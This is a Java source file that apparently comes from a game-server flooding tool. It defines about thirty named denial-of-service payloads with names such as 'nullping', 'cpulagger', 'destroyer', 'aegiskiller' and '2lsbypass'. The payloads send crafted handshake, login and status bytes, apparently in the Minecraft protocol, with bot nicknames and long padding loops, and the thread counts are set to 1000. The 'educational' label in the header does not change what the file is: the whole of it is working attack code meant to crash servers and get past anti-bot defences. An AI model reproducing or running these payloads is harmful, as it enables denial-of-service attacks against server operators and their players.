///Created by Daniel.Arvizu.Rosselli ///
// Free Use | No Licence //
// Made For Educational Purposes | Enjoy :D //
package me.arvizu.rompeculos.flood;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import me.arvizu.rompeculos.helper.RandomUtils;

public class Flooders {
  public Flooders() {
    this.flooders = new HashMap<>();
    this.flooders.put("localhost", (out, host, port) -> {
          out.write(15);
          out.write(0);
          out.write(47);
          out.write(9);
          out.writeBytes("localhost");
          out.write(99);
          out.write(224);
          out.write(1);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(1);
            out.write(0);
          } 
        });
    this.flooders.put("namenullping", (paramDataOutputStream, paramString, paramInt) -> {
          paramDataOutputStream.write(15);
          paramDataOutputStream.write(0);
          paramDataOutputStream.write(47);
          paramDataOutputStream.write(9);
          paramDataOutputStream.writeBytes("host");
          paramDataOutputStream.write(99);
          paramDataOutputStream.write(223);
          paramDataOutputStream.write(2);
          String str = "CIPHER_" + RandomUtils.randomString(8);
          paramDataOutputStream.write(str.length() + 2);
          paramDataOutputStream.write(0);
          paramDataOutputStream.write(str.length());
          paramDataOutputStream.writeBytes(str);
        });
    this.flooders.put("bosshandler", (out, host, port) -> {
          out.write(0);
          out.write(17);
          out.write(19);
          out.write(21);
          out.write(0);
          out.write(-15);
          out.write(-17);
          out.write(-19);
          out.write(-21);
          out.write(1);
          out.write(1);
          out.write(0);
          out.write(1);
          out.write(0);
          out.write(1);
          for (int i = 0; i < LOOP_AMOUNT; i++)
            out.write(0); 
        });
    this.flooders.put("fakepremium_join", (out, host, port) -> {
          String nick = RandomUtils.randomString(14);
          out.write(nick.length() + 2);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
          out.write(1);
          out.write(-8);
          out.write(-5);
          out.write(-8);
          out.write(-5);
          out.write(2);
          out.write(1);
        });
    this.flooders.put("botnullping", (out, host, port) -> {
          out.write(15);
          out.write(0);
          out.write(47);
          out.write(9);
          out.writeBytes("localhost");
          out.write(99);
          out.write(223);
          String nick = RandomUtils.randomString(14) + "_Paola";
          out.write(nick.length() + 2);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
          out.write(-71);
          for (int i = 0; i < 1900; i++) {
            out.write(1);
            out.write(0);
          } 
        });
    this.flooders.put("ultrajoin", (out, host, port) -> {
          long seconds = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis());
          if (seconds % 2L > 0L) {
            out.write(Prepares.getLoginPreparedBytes());
          } else {
            out.write(15);
          } 
          out.write(0);
          out.write(47);
          out.write(9);
          out.writeBytes("localhost");
          out.write(99);
          out.write(223);
          out.write(2);
          String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
          out.write(nick.length() + 2);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
        });
    this.flooders.put("fakejoin", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          String nick = "_CIPHER_BOT";
          out.writeBytes(nick);
          out.write(1);
          out.write(-8);
          out.write(-5);
          out.write(-8);
          out.write(-5);
          out.write(2);
          out.write(1);
          out.writeBoolean(true);
        });
    this.flooders.put("ufo", (out, host, port) -> {
          long seconds = TimeUnit.MILLISECONDS.toDays(System.currentTimeMillis());
          if (seconds % 2L > 0L) {
            out.write(Prepares.getLoginPreparedBytes());
          } else {
            out.write(15);
          } 
          out.write(0);
          out.write(47);
          out.write(9);
          out.writeBytes("localhost");
          out.write(99);
          out.write(223);
          out.write(2);
          String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
          out.write(nick.length() + 2);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
        });
    this.flooders.put("nAntibot", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          String nick = "_CIPHER_BOT";
          out.writeBytes(nick);
          out.writeBytes("fakejoin");
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          out.write(666);
          for (int i = 1; i < LOOP_AMOUNT; i++)
            out.write(0); 
        });
    this.flooders.put("fastjoin", (out, host, port) -> {
          out.write(15);
          out.write(0);
          out.write(47);
          out.write(9);
          out.writeBytes("localhost");
          out.write(99);
          out.write(223);
          out.write(2);
          String nick = RandomUtils.randomString(1);
          out.write(nick.length() + 2);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
        });
    this.flooders.put("2lsbypass", (out, host, port) -> {
          long seconds = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis());
          if (seconds % 2L > 0L) {
            out.write(Prepares.getMotdPreparedBytes());
          } else {
            out.write(Prepares.getLoginPreparedBytes());
            String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
            out.writeBytes(nick);
          } 
        });
    this.flooders.put("multikiller", (out, host, port) -> {
          long seconds = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis());
          if (seconds % 2L > 0L) {
            out.write(Prepares.getMotdPreparedBytes());
          } else if (seconds % 3L > 0L) {
            out.write(Prepares.getLoginPreparedBytes());
            String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
            out.writeBytes(nick);
            out.write(1);
            out.write(-8);
            out.write(-5);
            out.write(-8);
            out.write(-5);
            out.write(2);
            out.write(1);
            out.writeBoolean(true);
          } else if (seconds % 4L > 0L) {
            out.write(Prepares.getLoginPreparedBytes());
            String nick = "CIPHER_BOT";
            out.writeBytes(nick);
            String uuid = "a2xSdioDOANdo92JIdIADc";
            out.write(uuid.length() + nick.length() + 3);
            out.write(2);
            out.write(uuid.length());
            out.writeBytes(uuid);
            out.write(nick.length());
            out.writeBytes(nick);
          } else {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(99);
            out.write(223);
            out.write(2);
            String nick = RandomUtils.randomString(14);
            out.write(nick.length() + 2);
            out.write(0);
            out.write(nick.length());
            out.writeBytes(nick);
          } 
        });
    this.flooders.put("aegiskiller", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          String nick = "CIPHER_BOT";
          out.writeBytes(nick);
          String uuid = "a2xSdioDOANdo92JIdIADc";
          out.write(uuid.length() + nick.length() + 3);
          out.write(2);
          out.write(uuid.length());
          out.writeBytes(uuid);
          out.write(nick.length());
          out.writeBytes(nick);
        });
    this.flooders.put("cpulagger", (out, host, port) -> {
          out.write(0);
          out.write(17);
          out.write(19);
          out.write(21);
          out.write(0);
          out.write(-15);
          out.write(-17);
          out.write(-19);
          out.write(-21);
          out.write(1);
          out.write(1);
          out.write(0);
          out.write(1);
          out.write(0);
          out.write(1);
          for (int i = 0; i < LOOP_AMOUNT; i++)
            out.write(0); 
        });
    this.flooders.put("byte", (out, host, port) -> {
          out.write(8);
          out.write(-8);
          out.write(-4);
          out.write(-8);
          out.write(8);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(8);
            out.write(-8);
          } 
        });
    this.flooders.put("destroyer", (out, host, port) -> {
          out.write(0);
          out.write(80);
          out.write(-8000);
          out.write(-20000);
          out.write(-20000);
          out.write(20000);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(80000);
            out.write(-20000);
          } 
        });
    this.flooders.put("IDERROR", (out, host, port) -> {
          out.write(6);
          out.write(-6);
          out.write(-15);
          out.write(-16);
          out.write(6);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(6);
            out.write(-6);
          } 
        });
    this.flooders.put("fakehost", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
          out.writeBytes(nick);
          String fakehost = RandomUtils.randomString(255);
          out.write(fakehost.length());
          out.writeBytes(fakehost);
          out.write(99);
          out.write(223);
          out.write(2);
          out.writeBytes(fakehost);
          out.write(fakehost.length() + 2);
          out.write(0);
          out.write(fakehost.length());
        });
    this.flooders.put("proauthkiller", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
          out.writeBytes(nick);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
          out.write(1);
          out.write(-8);
          out.write(-5);
          out.write(-8);
          out.write(-5);
          out.write(2);
          out.write(1);
          out.writeBoolean(true);
        });
    this.flooders.put("flood", (out, host, port) -> {
          out.write(0);
          out.write(47);
          out.write(20);
          out.write(109);
          out.writeBytes(host);
          out.write(99);
          out.write(45);
          out.write(50);
          out.write(50);
          out.write(55);
          out.write(55);
          out.write(46);
          out.write(114);
          out.write(97);
          out.write(122);
          out.write(105);
          out.write(120);
          out.write(112);
          out.write(118);
          out.write(112);
          out.write(46);
          out.write(100);
          out.write(101);
          out.write(46);
          out.write(99);
          out.write(-35);
          out.write(2);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(1);
            out.write(0);
          } 
        });
    this.flooders.put("motdkiller", (out, host, port) -> out.write(Prepares.getMotdPreparedBytes()));
    this.flooders.put("legacy_motd", (out, host, port) -> out.write(Prepares.getLegacy_motdPrepradBytes()));
    this.flooders.put("joinbots", (out, host, port) -> {
          String nick = RandomUtils.randomString(14);
          out.write(nick.length() + 2);
          out.write(0);
          out.write(nick.length());
          out.writeBytes(nick);
        });
    this.flooders.put("botfucker", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
          out.writeBytes(nick);
        });
    this.flooders.put("consola", (out, host, port) -> {
          String message = "Hola" + ThreadLocalRandom.current().nextInt(100);
          out.write(message.getBytes());
          out.write(15);
          out.write(0);
          out.write(47);
          out.write(9);
          out.writeBytes("localhost");
          out.write(99);
          out.write(224);
          out.write(1);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(1);
            out.write(0);
          } 
        });
    this.flooders.put("paola", (out, host, port) -> {
          out.write(Prepares.getLoginPreparedBytes());
          out.write(Prepares.getLoginPreparedBytes());
          out.write(Prepares.getLoginPreparedBytes());
          out.write(Prepares.getLoginPreparedBytes());
          out.write(Prepares.getLoginPreparedBytes());
          String nick = RandomUtils.randomString(3) + "_CIPHER_BOT";
          out.writeBytes(nick);
          out.writeBytes("botfucker");
        });
    this.flooders.put("TimeOutKiller", (out, host, port) -> {
          out.write(535);
          out.write(456);
          out.write(12);
          out.write(52);
          out.writeBytes(host);
          out.write(367);
          out.write(1);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(1);
            out.write(0);
          } 
        });
    this.flooders.put("cpuburner6", (out, host, port) -> {
          out.write(0);
          out.write(47);
          out.write(13);
          out.write(52);
          out.write(53);
          out.write(46);
          out.write(56);
          out.write(57);
          out.write(46);
          out.write(49);
          out.write(52);
          out.write(49);
          out.write(46);
          out.write(49);
          out.write(52);
          out.write(54);
          out.write(99);
          out.write(-35);
          for (int i = 0; i < LOOP_AMOUNT; i++) {
            out.write(1);
            out.write(0);
          } 
        });
    this.flooders.put("cpuRipper", (out, host, port) -> {
          out.write(3);
          out.write(1);
          out.write(0);
          out.write(-69);
          out.write(1);
          out.write(0);
          out.write(0);
          out.write(-73);
          out.write(3);
          out.write(3);
          out.write(-53);
          out.write(-126);
          out.write(-82);
          out.write(83);
          out.write(21);
          out.write(-10);
          out.write(121);
          out.write(2);
          out.write(-62);
          out.write(11);
          out.write(-31);
          out.write(-62);
          out.write(106);
          out.write(-8);
          out.write(117);
          out.write(-23);
          out.write(50);
          out.write(35);
          out.write(60);
          out.write(57);
          out.write(3);
          out.write(63);
          out.write(-92);
          out.write(-57);
          out.write(-75);
          out.write(-120);
          out.write(80);
          out.write(31);
          out.write(46);
          out.write(101);
          out.write(33);
          out.write(0);
          out.write(0);
          out.write(72);
          out.write(0);
          out.write(47);
        });
  }
  
  public static int LOOP_AMOUNT = 1900;
  
  public static int threads = 1000;
  
  public static int number = 1000;
  
  private final Map<String, Flooder> flooders;
  
  public static void pingBytes(int n) {
    number = n;
  }
  
  public Set<String> getFlooders() {
    return new HashSet<>(this.flooders.keySet());
  }
  
  public Flooder findById(String id) {
    return this.flooders.get(id);
  }
  
  @FunctionalInterface
  public static interface Flooder {
    void flood(DataOutputStream param1DataOutputStream, String param1String, int param1Int) throws IOException;
  }
}
